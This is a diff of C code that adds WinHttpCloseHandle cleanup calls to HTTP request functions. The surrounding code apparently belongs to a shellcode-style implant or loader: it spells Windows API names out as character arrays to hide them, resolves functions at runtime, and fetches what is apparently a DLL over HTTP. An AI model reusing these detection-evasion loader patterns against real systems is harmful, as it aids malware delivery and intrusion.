@@ -276,6 +276,10 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
         bufferIndexChange += availableBytes/sizeof(WCHAR);
     }
 
+    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hRequest);
+    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hConnect);
+    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hSession);
+
     if (readSuccess)
     { return cpBuffer; }
     return NULL;
@@ -344,8 +348,12 @@ void PostRequest(PAPI api, WCHAR* server, INTERNET_PORT port, const WCHAR* endpo
                 if (bResults)
                 { bResults = ((WINHTTPRECEIVERESPONSE)api->WinHttpReceiveResponse)(hRequest, NULL); }
             }
+            ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hRequest);
         }
+        ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hConnect);
     }
+    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hSession);
+
 }
 
 LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize)
@@ -562,6 +570,10 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize)
 
     ((FREE)api->free)(lpEncodedBuffer);
     ((FREE)api->free)(lpContentLength);
+
+    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hRequest);
+    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hConnect);
+    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hSession);
 
     if (lpRawBuffer != NULL && lengthBuffer)
     { return lpRawBuffer; }
@@ -837,6 +849,7 @@ void myMain()
     CHAR WinHttpQueryDataAvailable_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'D', 'a', 't', 'a', 'A', 'v', 'a', 'i', 'l', 'a', 'b', 'l', 'e', 0 };
     CHAR winHttpQueryHeaders_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', 's', 0 };
     CHAR winHttpReadData_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'a', 'd', 'D', 'a', 't', 'a', 0 };
+    CHAR winHttpCloseHandle_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
     CHAR getLastError_c[] = {'G', 'e', 't', 'L', 'a', 's', 't', 'E', 'r', 'r', 'o', 'r', 0 };
     CHAR wprintf_c[] = { 'w', 'p', 'r', 'i', 'n', 't', 'f', 0 };
     CHAR printf_c[] = { 'p', 'r', 'i', 'n', 't', 'f', 0 };
@@ -875,6 +888,7 @@ void myMain()
     api->WinHttpQueryDataAvailable = GetSymbolAddress((HANDLE) winhttpdll, WinHttpQueryDataAvailable_c);
     api->WinHttpQueryHeaders = GetSymbolAddress((HANDLE)winhttpdll, winHttpQueryHeaders_c);
     api->WinHttpReadData = GetSymbolAddress((HANDLE)winhttpdll, winHttpReadData_c);
+    api->WinHttpCloseHandle = GetSymbolAddress((HANDLE)winhttpdll, winHttpCloseHandle_c);
 
     // Getting functions
     // User32
